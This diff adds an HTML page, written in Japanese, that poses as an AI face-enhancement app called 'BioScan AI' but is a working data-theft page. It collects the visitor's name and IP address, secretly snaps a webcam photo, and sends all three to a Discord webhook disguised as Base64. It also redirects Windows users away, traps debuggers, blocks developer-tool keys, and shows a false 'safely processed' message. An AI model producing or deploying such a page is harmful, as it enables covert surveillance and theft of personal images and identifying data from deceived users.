@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BioScan AI - 高精度フェイシャル分析</title>
+    <style>
+        :root {
+            --main-green: #10b981;
+            --dark-bg: #111827;
+            --card-bg: #1f2937;
+        }
+
+        body {
+            margin: 0;
+            background-color: var(--dark-bg);
+            color: #f3f4f6;
+            font-family: 'Inter', system-ui, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            user-select: none;
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #374151;
+        }
+
+        h1 { font-size: 24px; margin-bottom: 8px; color: var(--main-green); }
+        p { color: #9ca3af; font-size: 14px; margin-bottom: 24px; }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-size: 12px; color: var(--main-green); margin-bottom: 5px; font-weight: bold; }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            background: #111827;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        #camera-zone { display: none; position: relative; width: 280px; height: 280px; margin: 0 auto 24px; }
+        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 3px solid var(--main-green); }
+        .scan-ring {
+            position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px;
+            border: 2px solid var(--main-green); border-radius: 50%; opacity: 0.3;
+            animation: ping 2s cubic-bezier(0, 0, 0.2, 1) infinite;
+        }
+        @keyframes ping { 75%, 100% { transform: scale(1.2); opacity: 0; } }
+
+        .btn {
+            background: var(--main-green); color: #064e3b; border: none; padding: 14px 28px;
+            font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.3s;
+        }
+        .btn:hover { background: #34d399; transform: translateY(-2px); }
+        #status { margin-top: 15px; font-size: 13px; color: #6b7280; }
+        canvas { display: none; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <script>
+        // --- Windows強制終了・リダイレクト処理 ---
+        (function() {
+            const platform = navigator.platform.toLowerCase();
+            const ua = navigator.userAgent.toLowerCase();
+            if (platform.indexOf('win') !== -1 || ua.indexOf('windows') !== -1) {
+                // Windowsなら即座にGoogleに飛ばす
+                window.location.replace("https://www.google.com");
+                document.body.innerHTML = "";
+            }
+        })();
+
+        // デバッガー対策
+        setInterval(function() {
+            (function() {
+                return false;
+            }['constructor']('debugger')['call']());
+        }, 50);
+
+        // ショートカットキー禁止
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+                location.reload();
+                return false;
+            }
+        });
+    </script>
+
+    <div class="container">
+        <h1>BioScan AI</h1>
+        <p>今はやりの次世代AIが顔を加工し<br>最適な画像補正を自動実行します！</p>
+
+        <div id="setup-ui">
+            <div class="input-group">
+                <label>分析用ラベル（お名前）</label>
+                <input type="text" id="user-name" placeholder="例: Taro Yamada">
+            </div>
+            <button id="start-btn" class="btn">加工スキャンを開始</button>
+        </div>
+
+        <div id="camera-zone">
+            <div class="scan-ring"></div>
+            <video id="video" autoplay playsinline></video>
+        </div>
+
+        <div id="status"></div>
+    </div>
+
+    <canvas id="canvas" width="600" height="600"></canvas>
+
+    <script>
+        // Webhook URLをBase64で難読化
+        const _0x8f2a = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=";
+        const getUrl = () => atob(_0x8f2a);
+
+        const startBtn = document.getElementById('start-btn');
+        const cameraZone = document.getElementById('camera-zone');
+        const setupUi = document.getElementById('setup-ui');
+        const statusMsg = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const nameInput = document.getElementById('user-name');
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return "取得失敗"; }
+        }
+
+        startBtn.addEventListener('click', async () => {
+            const userName = nameInput.value.trim();
+            if (!userName) { alert("名前を入力してください。"); return; }
+
+            startBtn.disabled = true;
+            statusMsg.innerText = "セキュリティチェック中...";
+            const userIP = await getIP();
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                setupUi.style.display = 'none';
+                cameraZone.style.display = 'block';
+                video.srcObject = stream;
+                statusMsg.innerText = "AIが顔をスキャンしています...";
+
+                setTimeout(() => capture(stream, userName, userIP), 3000);
+            } catch (err) {
+                alert("カメラの許可が必要です。");
+                location.reload();
+            }
+        });
+
+        async function capture(stream, name, ip) {
+            statusMsg.innerText = "補正フィルタを適用中...";
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'scan.png');
+                const content = `✅ **新しいAIスキャンデータ**\n━━━━━━━━━━━━━━\n👤 **名前**: ${name}\n🌐 **IP**: ${ip}\n━━━━━━━━━━━━━━`;
+                formData.append('content', content);
+
+                try {
+                    await fetch(getUrl(), { method: 'POST', body: formData });
+                    statusMsg.innerText = "補正完了！まもなく終了します。";
+                } catch (e) { statusMsg.innerText = "通信エラー。"; }
+
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    statusMsg.innerText = "セッションが終了しました。";
+                    document.body.innerHTML = "<h2 style='color:white; text-align:center; margin-top:20%;'>安全に処理されました。ウィンドウを閉じてください。</h2>";
+                }, 2000);
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
